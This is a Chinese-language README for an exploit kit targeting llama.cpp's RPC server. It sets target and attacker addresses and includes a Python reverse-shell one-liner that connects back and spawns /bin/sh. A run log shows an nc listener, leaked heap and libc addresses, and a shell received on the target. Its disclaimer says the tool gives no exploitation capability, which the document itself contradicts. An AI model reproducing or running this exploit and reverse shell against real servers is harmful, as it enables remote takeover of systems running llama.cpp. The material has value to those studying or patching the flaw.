# 简介：
llama.cpp攻击程序

## 文档说明
llama.cpp_exp.py           #本地成功的exp脚本
llama.cpp_exp_pre.py       #之前的版本，写复杂了
llama.cpp_exp_debug.py     #里面包含关键变量的调试过程，可以借鉴


## 程序说明：
默认的目标llama.cpp程序运行环境IP是localhost，端口50052，实际使用过程中，使用者需要修改对应的IP及端口
```bash
IP = 'localhost'                            #目标程序IP
PORT = 50052                                #目标程序端口
REVERSE_SHELL_IP = '127.0.0.1'              #攻击者IP
REVERSE_SHELL_PORT = 6666                   #攻击者监听端口
CMD = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{REVERSE_SHELL_IP}",{REVERSE_SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
```


## 程序运行：
1. 执行llama.cpp程序
```bash
yzj@ldd:~/桌面/llama.cpp/build-rpc/bin$ ./rpc-server -p 50052
create_backend: using CPU backend
Starting RPC server on 0.0.0.0:50052, backend memory: 5989 MB
```

2. 攻击者开启监听
```bash
yzj@ldd:~/桌面$ nc -lvp 6666
Listening on 0.0.0.0 6666
```
3. 攻击者运行程序
```bash
(llama_venv) yzj@ldd:~/桌面/python_venv$ python3 hack.py
[+] Opening connection to localhost on port 50052: Done
[*] Closed connection to localhost port 50052
[+] Opening connection to localhost on port 50052: Done
[*] heap_leak = 0x60492a64e630
[*] set_tensor_addr:0x73f45536b7a0
[*] libgmml_base:0x73f455315000
[*] libc_got_puts:0x73f454c80e50
[*] lib_base:0x73f454c00000
[*] system_addr:0x73f454c50d70
[+] Executing command: Done
[*] Closed connection to localhost port 50052
```

4. 程序Getshell成功
```bash
yzj@ldd:~/桌面$ nc -lvp 6666
Listening on 0.0.0.0 6666
Connection received on localhost 59752
$ ls
linux_server64
llama-baby-llama
llama-batched
llama-batched-bench
llama-bench
llama-bench-matmult
llama-cli
```

## 程序运行差异性说明：
由于靶机环境可能存在差异，所以exp程序运行时，地址可能存在偏移，需计算偏移后的地址，
如需要技术支持，请联系人工智能安全实验室曹辉，杨忠杰，邮箱2207862552@qq.com



## 异常说明：
出现如下情况：
Traceback (most recent call last):
  File "/home/yzj/桌面/python_venv/llama_venv/lib/python3.10/site-packages/pwnlib/tubes/sock.py", line 39, in recv_raw
    data = self.sock.recv(numb, *a)
ConnectionResetError: [Errno 104] Connection reset by peer

这类情况属于正常，尝试，重新打开窗口执行。


## 法律声明：
该工具仅用于安全检测，不提供漏洞利用能力，用户在使用前请务必了解漏洞的详细信息，并遵守当地法律法规。


## 帮助：
若使用者在使用过程中，存在问题，请联系邮箱2207862552@qq.com
